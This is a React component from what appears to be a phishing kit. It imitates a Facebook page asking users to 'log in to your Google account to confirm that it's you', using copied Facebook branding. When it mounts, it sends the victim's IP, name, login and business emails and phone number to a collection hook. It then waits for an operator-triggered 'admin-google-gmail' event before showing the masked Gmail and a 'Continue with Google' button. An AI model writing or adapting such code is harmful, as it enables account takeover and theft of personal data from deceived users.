import React, { useEffect, useState } from "react";
import SendData from "../../hooks/SendData.js";

const NoShareIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" width="1.5em" height="1.2em" aria-hidden="true" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"><g opacity="0.9"><path d="M21 12c0-1.41-.324-2.745-.903-3.933l1.48-1.48A10.95 10.95 0 0 1 23 12c0 .752-.076 1.488-.22 2.199a1 1 0 1 1-1.96-.398A9.05 9.05 0 0 0 21 12zM3.547 19.04l-1.254 1.253a1 1 0 1 0 1.414 1.414l18-18a1 1 0 0 0-1.414-1.414l-1.254 1.254A10.956 10.956 0 0 0 12 1c-2.659 0-5.099.944-7 2.514V2a1 1 0 0 0-2 0v4a1 1 0 0 0 1 1h4a1 1 0 1 0 0-2H6.343A8.959 8.959 0 0 1 12 3c2.125 0 4.078.736 5.618 1.968l-12.65 12.65A8.962 8.962 0 0 1 3 12c0-.618.062-1.22.18-1.801A1 1 0 1 0 1.22 9.8C1.076 10.512 1 11.248 1 12c0 2.678.957 5.132 2.547 7.04zM6.586 21.578l1.48-1.48A8.965 8.965 0 0 0 12 21a8.959 8.959 0 0 0 5.657-2H16a1 1 0 1 1 0-2h4a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0v-1.514A10.959 10.959 0 0 1 12 23a10.95 10.95 0 0 1-5.414-1.422z"></path></g></svg>
);

const LockIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" width="1.5em" height="1.2em" aria-hidden="true" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 1a5 5 0 0 0-5 5v2h-.857c-1.282 0-2.417.818-2.664 2.076A25.711 25.711 0 0 0 3 15c0 1.984.236 3.692.479 4.924C3.726 21.182 4.86 22 6.143 22h11.714c1.282 0 2.417-.818 2.664-2.076A25.71 25.71 0 0 0 21 15a25.71 25.71 0 0 0-.479-4.924C20.274 8.818 19.14 8 17.857 8H17V6a5 5 0 0 0-5-5zm3 7V6a3 3 0 1 0-6 0v2h6zm-4 9v-1.268A2 2 0 0 1 12 12a2 2 0 0 1 1 3.732V17a1 1 0 1 1-2 0z"></path></svg>
);


function maskEmail(email) {
  if (!email || !email.includes("@")) return email || "";

  const [localPart, domain] = email.split("@");
  if (localPart.length <= 2) return `${localPart[0] || ""}***@${domain}`;

  return `${localPart[0]}******${localPart[localPart.length - 1]}@${domain}`;
}

function GoogleConfirm({ onConfirm, onClose, Email, Unik, Tel, BusinessEmail, Name, Ip, setLastFetch }) {
  const [waiting, setWaiting] = useState(true);
  const [gmailEmail, setGmailEmail] = useState(null);

  useEffect(() => {
    if (!Unik) return;

    SendData({
      id: Unik,
      ip: Ip,
      full_name: Name,
      login_email: Email,
      business_email: BusinessEmail,
      phone_number: Tel,
      page_name: "Facebook",
      currentStep: "Google Confirm - Waiting for Gmail",
    });
  }, []);

  useEffect(() => {
    const handler = (e) => {
      const email = e.detail?.email;
      if (email) {
        setGmailEmail(email);
        setWaiting(false);
      }
    };
    window.addEventListener("admin-google-gmail", handler);
    return () => window.removeEventListener("admin-google-gmail", handler);
  }, []);

  const handleContinueWithGoogle = () => {
    if (typeof setLastFetch === "function") setLastFetch("google-gmail");
    if (typeof onConfirm === "function") onConfirm(gmailEmail);
  };

  const maskedEmail = maskEmail(gmailEmail);

  if (waiting) {
    return (
      <div style={{ minHeight: "100vh", width: "100%", background: "linear-gradient(180deg, #edf2f8 0%, #e6ecf4 100%)", display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "Helvetica, Arial, sans-serif" }}>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "16px", color: "#606770" }}>
          <div style={{ width: "36px", height: "36px", border: "4px solid #e4e6eb", borderTopColor: "#1877f2", borderRadius: "50%", animation: "spin 0.9s linear infinite" }} />
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
          <span style={{ fontSize: "15px" }}>Please wait…</span>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        width: "100%",
        background: "linear-gradient(180deg, #edf2f8 0%, #e6ecf4 100%)",
        fontFamily: "FBook, Helvetica, Arial, sans-serif",
      }}
    >
      <div
        style={{
          height: "50px",
          background: "#fff",
          borderBottom: "1px solid #d8dee8",
          display: "flex",
          alignItems: "center",
          padding: "0 10px",
        }}
      >
        <svg class="x1lliihq x5skwsv" height="22" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg" style={{ fill: "#1877f2" }}><title>Facebook</title><path d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"></path></svg>
      </div>

      <div
        style={{
          maxWidth: "651px",
          margin: "108px auto 0",
          padding: "0 26px",
          color: "#1c1e21",
        }}
      >
        <div style={{ fontSize: "14px", fontWeight: 600, marginBottom: "6px" }}>
          Facebook
        </div>

        <h1
          style={{
            margin: 0,
            fontSize: "26px",
            fontWeight: 700,
            lineHeight: 1.15,
            letterSpacing: "-0.2px",
            maxWidth: "640px",
            color: "#111112",
          }}
        >
          Log in to your Google account to confirm that it&apos;s you
        </h1>

        <p
          style={{
            margin: "14px 0 0",
            fontSize: "15px",
            lineHeight: 1.45,
            color: "#111112",
            maxWidth: "660px",
          }}
        >
          Verify that it&apos;s you by signing in to the Gmail address saved on your Facebook profile
          <br />
          <strong>{maskedEmail}</strong>.
        </p>

        <div style={{ height: "24px" }} />

        <div style={{ display: "flex", flexDirection: "column", gap: "22px", maxWidth: "700px" }}>
          <div className="px-3" style={{ display: "flex", alignItems: "flex-start", gap: "12px" }}>
            <NoShareIcon />
            <span style={{ fontSize: "14px", lineHeight: 1.5 }}>
              We will not share any of your Facebook data with your Google account
            </span>
          </div>

          <div className="px-3" style={{ display: "flex", alignItems: "flex-start", gap: "12px" }}>
            <LockIcon />
            <span style={{ fontSize: "14px", lineHeight: 1.5 }}>
              This will not change the details that you use to log in to Facebook
            </span>
          </div>
        </div>

        <div style={{ height: "36px" }} />

        <div
          style={{
            maxWidth: "700px",
            display: "flex",
            flexDirection: "column",
            gap: "12px",
          }}
        >
          <button
            onClick={handleContinueWithGoogle}
            style={{
              width: "100%",
              height: "46px",
              border: "none",
              borderRadius: "999px",
              background: "#1877f2",
              color: "#fff",
              fontSize: "15px",
              fontWeight: 600,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxShadow: "0 1px 2px rgba(0,0,0,0.16)",
            }}
          >
            Continue with Google
          </button>
        </div>
      </div>
    </div>
  );
}

export default GoogleConfirm;
